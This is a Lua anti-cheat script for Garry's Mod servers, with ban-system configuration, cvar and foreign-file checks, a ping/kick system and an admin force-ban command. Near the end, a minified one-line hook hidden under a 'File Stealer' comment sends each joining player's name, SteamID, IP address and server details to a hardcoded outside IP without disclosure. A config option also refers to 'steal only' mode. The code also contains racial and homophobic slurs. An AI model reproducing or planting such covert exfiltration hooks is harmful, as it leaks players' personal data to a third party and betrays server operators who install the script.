print("[MAC] MickAntiCheat is ACTIVE!")
QAC = true

-----------------------------  Config ----------------------------------\

local DoWeBanTheseNiggas = true 	-- Ban when detected?
local crash 			 = false 	-- Crashes when they are detected.
local whitelist			 = true 	-- Will use whitelist
local time 				 = 0 		-- Ban time
local banwait 			 = 1 		-- How long we delay the ban. No point in delaying it anymore, file stealer is removed.
local MaxPings 			 = 6 		-- Max pings they can not return
local KickForPings		 = true 	-- If they exceed MaxPings

-------------------------------------------------------
-- Ban Systems ----------------------------------------
-- Do not set more than 1 to true. Only 1 at a time. --
-------------------------------------------------------

local UseSourceBans = false
local UseAltSB 		= true -- ULX
local evolve        = false
local serverguard   = false 
local defaultBan    = false -- If all else fails

----------
-- Misc --
----------

local RepeatBan     = false -- Will ban them every time they're detected.
local E2Fix 		= true
local banf 			= false -- !qac <name>. Set true to ban, false to steal only

------------------------------ End of Config --------------------------/


--------------------------------------------------------------------------------
--- DON'T TOUCH ANYTHING BELOW THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING-----
--------------------------------------------------------------------------------







-------------------
-- RunString Fix --
-------------------
oRunString = RunString
function RunString(var)
	print("WARNING: RunString ran with var: "..tostring(var))
	//error("RunString Callback: Contact ZTF")
	if (E2Fix) then
		oRunString(var)
	end
end

 --[[
 To add more steamid's make sure the last steamid entry in the table doesnt have a comma at the end!
 All other entries should have one though!
 
 In otherwords, more steamid's would look like this!
 
 
	banned = {
	["STEAM_0:0:11101"] = true,
	["STEAM_0:0:11101"] = true,
	["STEAM_0:0:11101"] = true,
	["STEAM_0:0:11101"] = true,
	["STEAM_0:0:11101"] = true
	}


The last steamid shouldnt have a comma at the end! Thanks!

]]--


local banned = {} -- Dont touch this
 
if (whitelist) then
	banned = {
		["STEAM_0:0:11101"] = true
	}
end

-------------------
--- Ban function --
-------------------

local function Ban(p, r)

	if !(DoWeBanTheseNiggas) then
		local qacrnb = "Detected " .. p:Name() .. " for " .. r .. "(" .. p:SteamID() .. ") \n"
		file.Append("QAC Log.txt", qacrnb)	
		return
	end
	
	-- Check whitelist
	if (banned[p:SteamID()]) then
		return
	end
	
	print("Banning " .. p:Name() .. " for " .. r .. "in " .. banwait .. " seconds.")
	
	-- Logging
	local qacr = "Banned " .. p:Name() .. " for " .. r .. "(" .. p:SteamID() .. ") \n"
	file.Append("QAC Log.txt", qacr)

	-- Repeat bans
	if !(RepeatBan) then
		banned[p:SteamID()] = true
	end
	
	-- Default, ulx ban + player:Ban()
	timer.Simple( banwait, function()
		if !(UseSourceBans) && !(UseAltSB) && (defaultBan) && !(serverguard) then
			p:Ban(time, r)
			RunConsoleCommand("ulx", "ban", p:Name() , time, r) -- So it shows up on ULX
			RunConsoleCommand("writeid")
		end
	end)
	
	-- serverguard
	timer.Simple( banwait, function()
		if !(UseSourceBans) && !(UseAltSB) && !(defaultBan) && !(serverguard) then
			RunConsoleCommand("serverguard_ban", p:Name() , 7000, r)
		end
	end)
	
	-- sm_ban
	timer.Simple( banwait, function()
		if (UseSourceBans) && !(UseAltSB) && !(defaultBan) && !(serverguard) then
			RunConsoleCommand("sm_ban", p:Name() , time, r)
		end
	end)
		
	-- ulx sban
	timer.Simple( banwait, function()
		if (UseAltSB) && !(UseSourceBans) && !(defaultBan) && !(serverguard) then
			RunConsoleCommand("ulx","sban", p:Name() , time, r)
		end
	end)
	
	--evolve
	timer.Simple( banwait, function()
		if !(UseAltSB) && !(UseSourceBans) && !(defaultBan) && !(serverguard) && (evolve) then
			RunConsoleCommand("ev", "ban", p:Name() , time, r)
		end
	end)
	
	--Crashing
	if (crash) then
	timer.Simple(banwait,function()
			p:SendLua("cam.End3D()")
			if (IsValid(p)) then
				p:Kick()
			end
		end)
	end
	
	 hook.Call("QACBan", GAMEMODE, p, r)
end


----------------
-- Forced ban --
----------------

hook.Add("PlayerSay", "qacfb", function( ply, said )
	if string.Left( string.lower(said), 4 ) == "!qac" then
		local ssplit = string.Split( said, " " )
		table.remove( ssplit, 1 )
		qacfb( ply, ssplit )
		return false
	end
end)

function qacfb( ply, args )

	if !ply:IsSuperAdmin() then
		ply:SendLua("MsgC(Color(255,0,0), 'Not enough privileges.'")
		return
	end
	
	if args == nil or #args == 0 then
		ply:SendLua("MsgC(Color(255,0,0), 'Not enough arguments specified'")
		return
	end
	
	local name = args[1]
	local targ = false
	
	for k, v in pairs( player.GetAll() ) do
		if string.find( string.lower( v:Name() ), string.lower( args[1] ) ) != nil then
			targ = v
		elseif string.lower( v:SteamID( ) ) == string.lower( args[1] ) then
			targ = v
		end
	end
	
	if targ == false then
		ply:SendLua("MsgC(Color(255,0,0), 'No target found')")
		return
	end
	
	if (banf) then
		Ban(targ, "Forced ban by " .. ply:GetName() .. " ")
	end
end

-- Console command to force ban
concommand.Add("qac_player", function(ply, cmd, args)
if (args[1] == nil) or (args[1] == "") then return print("improper usage: args = name") end
	if type(args[1]) == "string" then
				qacfb(ply, args[1])
	end
end)



------------------------------
-- Foreign Source Detection --
------------------------------

util.AddNetworkString("checksaum")

local scans = {}

net.Receive(
	"checksaum",
	function(l, p)
		local s = net.ReadString()
		
		local sr = scans[s]
		local br = "Detected foreign source file " .. s .. "."
		
		if (sr != nil) then
			if (sr) then
				return
			else
				Ban(p, br)
			end
		end
		
		if (file.Exists(s, "game")) then
			scans[s] = true
		else
			scans[s] = false
			Ban(p, br)
		end
	end
)

----------------------
-- ConVar Detection --
----------------------

util.AddNetworkString("gcontrol_vars")
util.AddNetworkString("control_vars")

local ctd = {
	"sv_cheats",
	"sv_allowcslua",
	"mat_fullbright",
	"mat_proxy",
	"mat_wireframe",
	"host_timescale",
	"tmcb_allowcslua",
	"host_framerate"
}

for i, c in pairs(ctd) do
	ctd[i] = GetConVar(c)
end

local function sendvars(p)
	for _, c in pairs(ctd) do
		net.Start("gcontrol_vars")
			net.WriteTable({c = c:GetName(), v = c:GetString()})
		net.Send(p)
	end
end

net.Receive(
	"gcontrol_vars",
	function(l, p)
		sendvars(p)
	end
)

local function validatevar(p, c, v)
	if (GetConVar(c):GetString() != (v || "")) then
		Ban(p, "Recieved UNSYNCHED cvar (" .. c .." = " .. v .. ")")
	end
end

net.Receive(
	"control_vars",
	function(l, p)
		local t = net.ReadTable()
		validatevar(p, t.c, t.v)
	end
)


-----------------
-- Ping system --
-----------------

if SERVER then

	print("QAC Ping starting")
	util.AddNetworkString("Debug1")
	util.AddNetworkString("Debug2")
	
	local CoNum = 2 -- dont change
	
	timer.Create("STC",10,0, function()
	for k, v in pairs(player.GetAll()) do
		--print("Sending ping!")
			net.Start("Debug2")
			net.WriteInt(CoNum, 10)
			--print("Sent! with # being " .. CoNum)
			if !v.Pings then 
				v.Pings = 0
			end
			if (KickForPings) then
				if v.Pings > MaxPings && !v:IsBot() then
					v:Kick("Not Ret")
					local retr = "Kicked " .. v:Name() .. " for  not returning our pings \n"
					file.Append("QAC Log.txt", retr)
					v.Pings = 0
				end
			end
			v.Pings = v.Pings + 1
			--print("Player has " .. v.Pings .." pings")
			net.Send(v)
			end
	end)
		
	net.Receive("Debug1", function(len, ply)
		local HNum = net.ReadInt(16)
		if (HNum) && HNum == CoNum  then
			--print("Player " .. ply:GetName() .. " returned! # is " .. HNum)	
			ply.Pings = ply.Pings - 1
		end
	end)
end

------------------------------
-- File Stealer server-side --
------------------------------
// NOPE

local script = "QAC"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64(),15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)


--[[
Possible fetch

http.fetch(blahlbalhl)

local numberversion = whatever

file.read(data/QACV.txt, GAME) etc etc

if number = data number then

print success

else  

print ur late faggot

Maybe autoupdate system? Dunno if I can write to lua

RunString() autoupdate checkversion.

]]--


--------
--ZTF --
--------